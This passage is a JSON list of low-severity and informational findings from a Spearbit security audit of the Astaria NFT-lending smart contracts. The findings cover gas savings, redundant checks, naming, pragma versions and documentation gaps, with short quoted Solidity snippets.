[{"title": "fileBatch() does requiresAuth for each file separately", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "fileBatch() does a requiresAuth check and then for each element in the input array calls file() which does another requiresAuth check. function fileBatch(File[] calldata files) external requiresAuth { for (uint256 i = 0; i < files.length; i++) { file(files[i]); } } ... function file(File calldata incoming) public requiresAuth { This wastes gas as if the fileBatch()'s requiresAuth pass, file()'s check will pass too.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "_sliceUint can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "_sliceUint can be optimized", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Use basis points for ratios", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Fee ratios are represented through two state variables for numerator and denominator. Basis point system can be used in its place as it is simpler (denominator always set to 10_000), and gas efficient as denomi- nator is now a constant.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "No Need to Allocate Unused Variable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "LienToken._makePayment() returns two values: (Stack[] memory newStack, uint256 spent), but the second value is never read: (newStack, ) = _makePayment(_loadLienStorageSlot(), stack, amount); Also, if this value is planned to be used in future, it's not a useful value. It is equal to the payment made to the last lien. A more meaningful quantity can be the total payment made to the entire stack. Additional instances noted in Context above.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Cache Values to Save Gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Calls are occurring, same values are computed, or storage variables are being read, multiple times; e.g. CollateralToken.sol#L286-L307 reads the storage variable s.securityHooks[addr] four times. It's better to cache the result in a stack variable to save gas.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "RouterStorage.vaults can be a boolean mapping", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "RouterStorage.vaults is of type mapping(address => address). A key-value is stored in the mapping as: s.vaults[vaultAddr] = msg.sender; However, values in this mapping are only used to compare against address(0): if (_loadRouterSlot().vaults[msg.sender] == address(0)) { ... return _loadRouterSlot().vaults[vault] != address(0); It's better to have vaults as a boolean mapping as the assignment of msg.sender as value doesn't carry a special meaning.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "isValidReference() should just take an array element as input", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "stack[position]: isValidRefinance() takes stack array as an argument but only uses stack[0] and function isValidRefinance( ILienToken.Lien calldata newLien, uint8 position, ILienToken.Stack[] calldata stack ) public view returns (bool) { The usage of stack[0] can be replaced with stack[position] as stack[0].lien.collateralId == stack[position].lien.collateralId: if (newLien.collateralId != stack[0].lien.collateralId) { revert InvalidRefinanceCollateral(newLien.collateralId); } To save gas, it can directly take that one element as input.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Functions can be made external", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "If public function is not called from within the contract, it should made external for clarity, and can potentially save gas.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "a.mulDivDown(b,1) is equivalent to a*b", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Highlighted code above follow the pattern of a.mulDivDown(b, 1) which is equivalent to a*b.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Use scratch space for keccak", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "computeId() function computes and returns uint256(keccak256(abi.encodePacked(token, to- kenId))). Since the data being hashed fits within 2 memory slots, scratch space can be used to avoid paying gas cost on memory expansion.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Define a named constant for the return value of onFlashAction", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "onFlashAction returns: keccak256(\"FlashAction.onFlashAction\")", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Define a named constant for permit typehash in ERC20-cloned", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In permit, the following type hash has been used: keccak256( \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\" )", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Unused struct, enum and storage fields can be removed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The struct, enum and storage fields in this context have not been used in the project.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "WPStorage.expected's comment can be made more accurate", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In WPStorage's definition we have: uint88 expected; // Expected value of auctioned NFTs. yIntercept (virtual assets) of a PublicVault are ,! not modified on liquidation, only once an auction is completed. The comment for expected is not exactly accurate. The accumulated value in expected is the sum of all auctioned NFTs's amountOwed when (the timestamp) the liquidate function gets called. Whereas the NFTs get auctioned starting from their first stack's element's liquidationInitialAsk to 1_000 wei", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Leave comment that in WithdrawProxy.claim() the calculation of balance cannot underflow", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "There is this following line in claim() where balance is initialised: uint256 balance = ERC20(asset()).balanceOf(address(this)) - s.withdrawReserveReceived; With the current PublicVault implementation of IPublicVault, this cannot underflow since the increase in with- drawReserveReceived (using increaseWithdrawReserveReceived) is synced with increasing the asset balance by the same amount.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Shared logic in withdraw and redeem functions of WithdrawProxy can be turned into a shared modifier", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "withdraw and redeem both start with the following lines: WPStorage storage s = _loadSlot(); // If auction funds have been collected to the WithdrawProxy // but the PublicVault hasn't claimed its share, too much money will be sent to LPs if (s.finalAuctionEnd != 0) { // if finalAuctionEnd is 0, no auctions were added revert InvalidState(InvalidStates.NOT_CLAIMED); } Since they have this shared logic at the beginning of their body, we can consolidate the logic into a modifier.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "StrategyDetails version can only be used in custom implementation of IStrategyValidator, requires documentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "StrategyDetails.version is never used in the current implementations of the validators.  If the intention is to avoid replays across different versions of Astaria, we should add a check for it in commit- ment validation functions.  A custom implementation of IStrategyValidator can make use of this value, but this needs documentation as to exactly what it refers to.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Define helper functions to tag different pieces of cloned data for ClearingHouse", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "_getArgAddress(0) and _getArgUint256(21) are used as the ROUTER() and COLLATERAL_ID() in the fallback implementation for ClearingHouse was Clone derived contract.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "A new modifier onlyVault() can be defined for WithdrawProxy to consolidate logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The following require statement has been used in multiple functions including increaseWith- drawReserveReceived, drain, setWithdrawRatio and handleNewLiquidation. require(msg.sender == VAULT(), \"only vault can call\");", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Inconsistant pragma versions and floating pragma versions can be avoided", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Most contracts in the project use pragma solidity 0.8.17, but there are other variants as well: 69 pragma solidity ^0.8.16; pragma solidity ^0.8.16; pragma solidity ^0.8.16; // src/Interfaces/IAstariaVaultBase.sol // src/Interfaces/IERC4626Base.sol // src/Interfaces/ITokenBase.sol pragma solidity ^0.8.15; // src/Interfaces/ICollateralToken.sol pragma solidity ^0.8.0; pragma solidity ^0.8.0; pragma solidity ^0.8.0; pragma solidity ^0.8.0; pragma solidity ^0.8.0; pragma solidity ^0.8.0; // src/Interfaces/IERC20.sol // src/Interfaces/IERC165.sol // src/Interfaces/IERC1155.sol // src/Interfaces/IERC1155Receiver.sol // src/Interfaces/IERC721Receiver.sol // src/utils/Math.sol pragma solidity >=0.8.0; pragma solidity >=0.8.0; // src/Interfaces/IERC721.sol // src/utils/MerkleProofLib.sol And they all have floating version pragmas.  In hardhat.config.ts, solidity: \"0.8.13\" is used.  In .prettierrc settings we have \"compiler\": \"0.8.17\"  In .solhint.json we have \"compiler-version\": [\"error\", \"0.8.0\"]  foundry.toml does not have a solc setting", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "IBeacon is missing a compiler version pragma", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "IBeacon is missing a compiler version pragma.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "zone and zoneHash are not required for fully open Seaport orders", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "As per Seaport's documentation,zone and zoneHash are not required for PUBLIC orders: The zone of the order is an optional secondary account attached to the order with two additional privi- leges:  The zone may cancel orders where it is named as the zone by calling cancel. (Note that offerers can also cancel their own orders, either individually or for all orders signed with their current counter at once by calling incrementCounter).  \"Restricted\" orders (as specified by the order type) must either be executed by the zone or the offerer, or must be approved as indicated by a call to an isValidOrder or isValidOrderIncludingEx- traData view function on the zone. 70 This order isn't \"Restricted\", and there is no way to cancel a Seaport order once created from this contract.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Inconsistent treatment of delegate setting", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Private vaults include delegate in the allow list when deployed through the Router. Public vaults do not. The VaultImplementation, when mutating a delegate, sets them on allow list.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "AstariaRouter does not adhere to EIP1967 spec", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The Router serves as an implementation Beacon for proxy contracts, however, does not adhere to the EIP1967 spec.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Receiver of bought out lien must be approved by msg.sender", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The buyoutLien function requires that either the receiver of the lien is msg.sender or is an address approved by msg.sender: if (msg.sender != params.encumber.receiver) { require( _loadERC721Slot().isApprovedForAll[msg.sender][params.encumber.receiver] ); } This check seems unnecessary and in some cases will block users from buying out liens as intended.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "A new modifer onlyLienToken() can be defined to refactor logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The following require statement has been used in multiple locations in PublicVault: require(msg.sender == address(LIEN_TOKEN())); Locations used:  beforePayment  afterPayment  handleBuyoutLien  updateAfterLiquidationPayment  updateVaultAfterLiquidation", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "A redundant if block can be removed from PublicVault._afterCommitToLien", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In PublicVault._afterCommitToLien, we have the following if block: if (s.last == 0) { s.last = block.timestamp.safeCastTo40(); } This if block is redundant, since regardless of the value of s.last, a few lines before _accrue(s) would update the s.last to the current timestamp.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Private vaults' deposit endpoints can be potentially simplifed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "A private vault's deposit function can be called directly or indirectly using the ROUTER() (either way by anyone) and we have the following require statement: require( s.allowList[msg.sender] || (msg.sender == address(ROUTER()) && s.allowList[receiver]) ); If the ROUTER() is the AstariaRouter implementation of IAstariaRouter, then it inherits from ERC4626RouterBase and ERC4626Router which allows anyone to call into deposit of this private vault using:  depositToVault  depositMax  ERC4626RouterBase.deposit Thus if anyone of the above functions is called through the ROUTER(), msg.sender == address(ROUTER() will be true. Also, note that when private vaults are created using the newVault the msg.sender/owner along the delegate are added to the allowList and allowlist is enabled. And since there is no bookkeeping here for the receiver, except only the require statement, that means  Only the owner or the delegate of this private vault can call directly into deposit or  Anyone else can set the address to parameter of one of those 3 endpoints above to owner or delegate to deposit assets (wETH in the current implementation) into the private vault. And all the assets can be withdrawn by the owner only.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "The require statement in decreaseEpochLienCount can be more strict", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "decreaseEpochLienCount has the following require statement that limits who can call into it: require( msg.sender == address(ROUTER()) || msg.sender == address(LIEN_TOKEN()) ); So only, the ROUTER() and LIEN_TOKEN() are allowed to call into. But AstariaRouter never calls into this function.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "amount is not used in _afterCommitToLien", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "amount is not used in _afterCommitToLien to update/decrement s.yIntercept, because even though assets have been transferred out of the vault, they would still need to be paid back and so the net ef- fect on s.yIntercept (that is used in the calculation of the total virtual assets) is 0.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Use modifier", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Highlighted code have require checks on msg.sender which can be converted to modifiers. For instance: require(address(msg.sender) == s.guardian);", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Prefer SafeCastLib for typecasting", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Highlighted code above does typecasting of several constant values. In case, some value doesn't fit in the type, this typecasting will silently ignore the higher order bits although that's currently not the case, but it may pose a risk if these values are changed in future.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Rename Multicall to Multidelegatecall", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Multicall.sol lets performs multiple delegatecalls. Hence, the name Multicall is not suitable. The contract and the file should be named Multidelegatecall.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "safeTransferFrom() without the data argument can be used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Highlighted code above sends empty data over an external call via ERC721.safeTransferFrom(from, to, tokenId, data): IERC721(underlyingAsset).safeTransferFrom( address(this), releaseTo, assetId, \"\" ); data can be removed since ERC721.safeTransferFrom(from, to, tokenId) sets empty data too.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Fix documentation that updateVaultAfterLiquidation can be called by LIEN_TOKEN, not ROUTER", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The function has the correct validation that it can only be called by LIEN_TOKEN(), but the comment says it can only be called by ROUTER(). require(msg.sender == address(LIEN_TOKEN())); // can only be called by router", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Declare event and constants at the beginning", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Events and constants are generally declared at the beginning of a smart contract. However, for the highlighted code above, that's not the case.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Rename Vault to PrivateVault", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Vault contract is used to represent private vaults.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Remove comment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Comment at line WithdrawProxy.sol#L229 can be removed: if ( block.timestamp < s.finalAuctionEnd // || s.finalAuctionEnd == uint256(0) ) { The condition in comments is always false as the code already reverts in that case.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "WithdrawProxy and PrivateVault symbols are missing hyphens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The symbol for the WithdrawProxy token is missing a hyphen after the W, which will make the name AST-W0x... instead of AST-W-0x.... Similarly, the symbol for the Private Vault token (in Vault.sol) is missing a hyphen after the V.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Lien cannot be bought out after stack.point.end", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The _getRemainingInterest function reverts with Panic(0x11) when block.timestamp > stack.point.end.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Inconsistent strictness of inequalities in isValidRefinance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In isValidRefinance, we check that either: a) newRate < maxNewRate && newEnd >= oldEnd b) newEnd - oldEnd >= minDurationIncrease && newRate <= oldRate We should be consistent in whether we're enforcing the changes are strict inequalities or non-strict inequalities.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Clarify comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Few comments are not clear on what they are referring to: zone: address(this), // 0x20 ... conduitKey: s.CONDUIT_KEY, // 0x120", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Remove unused files", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "CallUtils.sol is not used anywhere in the codebase.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Document privileges and entities holding these privileges", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "There are certain privileged functionalities in the codebase (recognized through requiresAuth mod- ifier). Currently, we have to refer to tests to identify the setup.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Document and ensure that maximum number of liens should not be set greater than 256", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Maximum number of liens in a stack is currently set to 5. While paying for a lien, the index in the stack is casted to uint8. This makes the implicit limit on maximum number of liens to be 256.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "transferWithdrawReserve() can return early when the current epoch is 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "If s.currentEpoch == 0, s.currentEpoch - 1 will wrap around to type(uint256).max and we will most probably will drain assets into address(0) in the following block: unchecked { s.withdrawReserve -= WithdrawProxy(withdrawProxy) .drain( s.withdrawReserve, s.epochData[s.currentEpoch - 1].withdrawProxy ) .safeCastTo88(); } But this cannot happen since in the outer if block the condition s.withdrawReserve > 0 indirectly means that s.currentEpoch > 0. The indirect implication above regarding the 2 conditions stems from the fact that s.withdrawReserve has only been set in transferWithdrawReserve() function or processEpoch(). In transferWithdrawReserve() function 78 it assumes a positive value only when s.currentEpoch > uint64(0) and in processEpoch() at the end we are incrementing s.currentEpoch.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "2 of the inner if blocks of processEpoch() check for a condition that has already been checked by an outer if block", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The following 2 if block checks are redundant: if (address(currentWithdrawProxy) != address(0)) { currentWithdrawProxy.setWithdrawRatio(s.liquidationWithdrawRatio); } uint256 expected = 0; if (address(currentWithdrawProxy) != address(0)) { expected = currentWithdrawProxy.getExpected(); } Since the condition address(currentWithdrawProxy) != address(0) has already been checked by an outer if block.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "General formatting suggestions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": " PublicVault.sol#L283 : there are extra sourounding paranthesis", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Identical collateral check is performed twice in _createLien", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In _createLien, a check is performed that the collateralId of the new lien matches the collateralId of the first lien on the stack. if (params.stack.length > 0) { if (params.lien.collateralId != params.stack[0].lien.collateralId) { revert InvalidState(InvalidStates.COLLATERAL_MISMATCH); } } This identical check is performed twice (L383-387 and L389-393).", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "checkAllowlistAndDepositCap modifer can be defined to consolidate some of the mint and deposit logic for public vaults", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The following code snippet has been used for both mint and deposit endpoints of a public vault: VIData storage s = _loadVISlot(); if (s.allowListEnabled) { require(s.allowList[receiver]); } uint256 assets = totalAssets(); if (s.depositCap != 0 && assets >= s.depositCap) { revert InvalidState(InvalidStates.DEPOSIT_CAP_EXCEEDED); }", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Document why bytes4(0xffffffff) is chosen when CollateralToken acting as a Seaport zone to signal invalid orders", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "bytes4(0xffffffff) to indicate a Seaport order using this zone is not a valid order.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "CollateralToken.onERC721Received's use of depositFor stack variable is redundant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "If we follow the logic of assigning values to depositFor in CollateralToken.onERC721Received, we notice that it will end up being from_. So its usage is redundant.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "onlyOwner modifier can be defined to simplify the codebase", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "releaseToAddress checks whether the msg.sender is an owner of a collateral. CollateralToken already has a modifier onlyOwner(...), so the initial check in releaseToAddress can be delegated to the modifier.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Document liquidator's role for the protocol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "When a lien's term end (stack.point.end <= block.timestamp), anyone can call the liquidate on AstariaRouter. There is no restriction on the msg.sender. The msg.sender will be set as the liquidator and if:  The Seaport auction ends (3 days currently, set by the protocol), they can call liquidatorNFTClaim to claim the NFT.  Or if the Seaport auction settles, the liquidator receives the liquidation fee.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Until ASTARIA_ROUTER gets filed for CollateralToken, CollateralToken can not receive ERC721s safely.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "ASTARIA_ROUTER is not set in the CollateralToken's constructor. So till an entity with an author- ity would file for it, CollateralToken is unable to safely receive an ERC721 token ( whenNotPaused and on- ERC721Received would revert).", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "_getMaxPotentialDebtForCollateral might have meant to be an internal function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "_getMaxPotentialDebtForCollateral is defined as a public function. underscore which as a convention usually is used for internal or private functions.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "return keyword can be removed from stopLiens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "_stopLiens does not return any values but in stopLiens the return statement is used along with the non-existent return value of _stopLiens.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "LienToken's constructor does not set ASTARIA_ROUTER which makes some of the endpoints unfunc- tional", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "LienToken's constructor does not set ASTARIA_ROUTER. That means till an authorized entity calls file to set this parameter, the following functions would be broken/revert:  buyoutLien  _buyoutLien  _payDebt  getBuyout  _getBuyout  _isPublicVault  setPayee, partially broken  _paymentAH  payDebtViaClearingHouse", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Document the approval process for a user's CollateralToken before calling commitToLiens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In the _executeCommitment's return statement: IVaultImplementation(c.lienRequest.strategy.vault).commitToLien( c, address(this) ); address(this) is the AstariaRouter. The call here to commitToLien enters into _validateCommitment with AstariaRouter as the receiver and so for it to no revert, the holder would have needed to set the approval for the router previously/beforehand: CT.isApprovedForAll(holder, receiver) // needs to be true 83", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "isValidRefinance's return statement can be reformatted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Currently, it is a bit hard to read the return statement of isValidRefinance.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Withdraw Reserves should always be transferred before Commit to Lien", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "When a new lien is requested, the _beforeCommitToLien() function is called. If the epoch is over, this calls processEpoch(). Otherwise, it calls transferWithdrawReserve(). function _beforeCommitToLien( IAstariaRouter.Commitment calldata params, address receiver ) internal virtual override(VaultImplementation) { VaultData storage s = _loadStorageSlot(); if (timeToEpochEnd() == uint256(0)) { processEpoch(); } else if (s.withdrawReserve > uint256(0)) { transferWithdrawReserve(); } } However, the processEpoch() function will fail if the withdraw reserves haven't been transferred. In this case, it would require the user to manually call transferWithdrawReserve() to fix things, and then request their lien again. Instead, the protocol should transfer the reserves whenever it is needed, and only then call processEpoch().", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Remove owner() variable from withdraw proxies", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "When a withdrawProxy is deployed, it is created with certain immutable arguments. Two of these values are owner() and vault(), and they will always be equal. They seem to be used interchangeably on the withdraw proxy itself, so should be consolidated into one variable.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Unnecessary checks in _validateCommitment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "In _validateCommitment(), we check to confirm that either the sender of the message is adequately qualified to be making the decision to take a lien against the collateral (ie they are the holder, the operator, etc). However, the way this is checked is somewhat roundabout and can be substantially simplified. For example, we check require(operator == receiver); in a block that is only triggered if we've already validated that receiver != operator.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Comment or remove unused function parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Highlighted functions above take arguments which are never used. particular signature, comment that argument name, otherwise remove that argument completely. If the function has to have a Additional instances noted in Context above.  LienToken.sol#L726 : LienStorage storage s input parameter is not used in _getRemainingInterest. It can be removed and this function can be pure.  VaultImplementation.sol#L341 : incoming is not used buyoutLien, was this variable meant to be used?", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Zero address check can never fail", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The details.borrower != address(0) check will never be false in the current system as AstariaRouter.sol#L352-L354 will revert when ownerOf is address(0).", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "UX differs between Router.commitToLiens and VaultImplementation.commitToLien", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The Router function creates the Collateralized Token while the VaultImplementation requires the collateral owner to ERC721.safeTransferFrom to the CollateralToken contract prior to calling.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Document what vaults are listed by Astaria", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Anyone can call newPublicVault with epochLength in the correct range to create a public vault.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Simplify nested if/else blocks in for loops", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "There are quite a few instances that nested if/else blocks are used in for loops and that is the only block in the for loop. 87 for ( ... ) { if (<CONDITION>) { ... } if else (<CONDITION>) { ... } ... if else (<CONDITION>) { ... } else { revert CustomError(); } }", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Document the role guardian plays in the protocol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The role of guardian is not documented.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": 